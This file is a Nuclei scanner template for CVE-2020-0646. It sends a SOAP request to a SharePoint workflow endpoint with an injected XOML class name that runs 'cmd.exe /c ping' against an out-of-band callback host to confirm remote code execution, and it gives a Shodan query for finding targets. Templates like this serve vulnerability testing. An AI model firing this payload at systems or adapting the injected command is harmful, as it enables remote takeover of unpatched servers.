http/cves/2020/CVE-2020-0646.yaml

id: CVE-2020-0646

info:
  name: Microsoft .NET Framework RCE - CVE-2020-0646
  author: xcr-19
  severity: critical
  description: |
    Microsoft .NET Framework contains a remote code execution caused by improper input validation, letting remote attackers execute arbitrary code, exploit requires sending malicious input to the system.
  reference:
    - http://packetstormsecurity.com/files/156930/SharePoint-Workflows-XOML-Injection.html
    - https://www.mdsec.co.uk/2020/01/code-injection-in-workflows-leading-to-sharepoint-rce-cve-2020-0646/
    - https://nvd.nist.gov/vuln/detail/cve-2020-0646
  tags: cve,cve2020,rce,dotnet,kev
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8

  metadata:
    verified: false
    shodan-query: ms .net remoting

http:
  - raw:
      - |
        POST /_vti_bin/WebPartPages.asmx HTTP/1.1
        Host: {{Hostname}}
        Accept: auth/sicily
        Content-Type: text/xml;charset=UTF-8
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <ValidateWorkflowMarkupAndCreateSupportObjects xmlns="http://microsoft.com/sharepoint/webpartpages">
              <workflowMarkupText>
                <![CDATA[
                  <SequentialWorkflowActivity x:Class="MyWorkflow" x:Name="foobar"
                  xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
                  xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow">
                    <CallExternalMethodActivity x:Name="foo" MethodName='bar' InterfaceType='System.String);}Object/**/test2=System.Diagnostics.Process.Start("cmd.exe", "/c ping {{interactsh-url}}");private/**/void/**/foobar(){//' />
                  </SequentialWorkflowActivity>
                ]]>
              </workflowMarkupText>
              <rulesText></rulesText>
              <configBlob></configBlob>
              <flag>2</flag>
            </ValidateWorkflowMarkupAndCreateSupportObjects>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - dns
      - type: status
        status:
          - 200